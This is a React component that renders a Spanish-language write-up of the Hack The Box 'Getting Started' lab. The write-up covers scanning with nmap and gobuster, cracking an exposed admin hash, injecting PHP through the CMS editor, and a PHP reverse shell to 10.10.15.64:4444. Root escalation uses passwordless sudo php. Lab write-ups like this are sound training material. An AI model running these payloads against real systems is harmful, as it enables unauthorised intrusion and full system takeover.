import React from "react";

export default function Getting_Starterd_HTB() {
  return (
    <article className="prose prose-invert">
      <h1>Comprobación de Conocimientos — Getting Started (HTB)</h1>
      <br />
      <img src="/images/Blog/HTB/getting_started.png" alt="Getting Started thumbnail" />
      <br />
      <p>
        <strong>Objetivos:</strong> El primer objetivo de este reto es, una vez comprometido el servidor,
        obtener el contenido de la flag en <code>user.txt</code>. El segundo objetivo es obtener la flag
        en <code>root.txt</code> tras escalar privilegios.
      </p>
      <br />
      <h2>Reconocimiento</h2>

      <p>Escaneo inicial con <code>nmap</code>:</p>
      <pre className="rounded bg-muted p-4 overflow-auto">{`nmap -p- -n -Pn --open -sS --min-rate 1000 {Ip}`}</pre>
      <br />
      <p>Parámetros clave:</p>
      <ul>
        <li><code>-p-</code> escanea todos los puertos</li>
        <li><code>-n</code> evita resolución DNS</li>
        <li><code>-Pn</code> no realiza descubrimiento de hosts</li>
        <li><code>--open</code> muestra solo puertos abiertos</li>
        <li><code>-sS</code> SYN stealth scan</li>
        <li><code>--min-rate 1000</code> velocidad mínima de paquetes</li>
      </ul>
      <br />
      <p>Tras el escaneo inicial se detectaron dos puertos abiertos: <code>22</code> y <code>80</code>.</p>

      <p>Escaneo más detallado en los puertos 22 y 80:</p>
      <pre className="rounded bg-muted p-4 overflow-auto">{`nmap -p22,80 -n -Pn -sCV {Ip}`}</pre>

      <p>Comprobamos versiones de servicios y posibles scripts útiles. Además usamos <code>whatweb</code> y <code>curl</code> para analizar el servicio web:</p>
      <pre className="rounded bg-muted p-4 overflow-auto">{"whatweb http://{IP}:80"}</pre>

      <h2>Investigación del CMS</h2>
      <p>La web usa el CMS <em>GetSimple</em>. Hicimos fuzzing de directorios con <code>gobuster</code>:</p>
      <pre className="rounded bg-muted p-4 overflow-auto">{`gobuster dir -u http://{IP} -w {/path/to/wordlist/}`}</pre>

      <p>Entre los hallazgos relevantes en <code>/data/other/</code>:</p>
      <br />
      <ul>
        <li><code>website.xml</code></li>
        <li><code>authorization.xml</code> con una API key</li>
        <li><code>plugins.xml</code> indicando plugins instalados</li>
        <li><code>users/admin.xml</code> donde aparece el usuario <code>admin</code> y un hash</li>
      </ul>
      <br />
      <p>El hash encontrado (<code>d033e22ae348aeb5660fc2140aec35850c4da997</code>) se comprobó en servicios como CrackStation y devuelve <code>admin</code>, por lo que probamos credenciales en <code>/admin/</code> y el acceso fue exitoso.</p>
      <br />
      <h2>Obtención de acceso y RCE</h2>
      <p>En el panel se pueden editar páginas, temas y componentes (archivos PHP). Probamos a inyectar código PHP en un componente, por ejemplo:</p>
      <pre className="rounded bg-muted p-4 overflow-auto">{`<?php system('id'); ?>`}</pre>
      <br />
      <p>Como el servidor interpreta PHP, logramos ejecución remota de comandos. Montamos una reverse shell con:</p>
      <pre className="rounded bg-muted p-4 overflow-auto">{`<?php system('php -r \'$sock=fsockopen("10.10.15.64",4444);exec("/bin/sh -i <&3 >&3 2>&3");\''); ?>`}</pre>
      <br />
      <p>En el atacante nos pusimos en escucha:</p>
      <pre className="rounded bg-muted p-4 overflow-auto">{`nc -lvnp 4444`}</pre>
      <br />
      <p>Al visitar la web con la carga, conseguimos una shell <code>/bin/sh</code>. Convertimos la TTY con:</p>
      <pre className="rounded bg-muted p-4 overflow-auto">{`python3 -c 'import pty; pty.spawn("/bin/bash")'`}</pre>

      <h2>Recoger la primera flag</h2>
      <br />
      <p>Explorando el sistema localizamos y leímos <code>user.txt</code> obteniendo la primera flag.</p>
      <br />
      <h2>Escalada a root</h2>
      <p>Comprobamos permisos sudo con:</p>
      <pre className="rounded bg-muted p-4 overflow-auto">{`sudo -l`}</pre>
      <br />
      <p>Encontramos que podemos ejecutar <code>php</code> como root sin contraseña. Aprovechamos esto para obtener una shell privilegiada:</p>
      <pre className="rounded bg-muted p-4 overflow-auto">{`sudo php -r "system('/bin/bash');"`}</pre>
      <br />
      <p>Accedimos a <code>/root</code> y leímos <code>root.txt</code>, capturando la segunda flag.</p>
      <br />
      <h2>Conclusión</h2>
      <br />
      <p>
        Este reto es un buen ejercicio para practicar reconocimiento web, exposición de información sensible en archivos públicos,
        explotación de RCE vía edición de componentes y escalada mediante comandos permitidos por <code>sudo</code>.
      </p>
    </article>
  );
}
      <br />
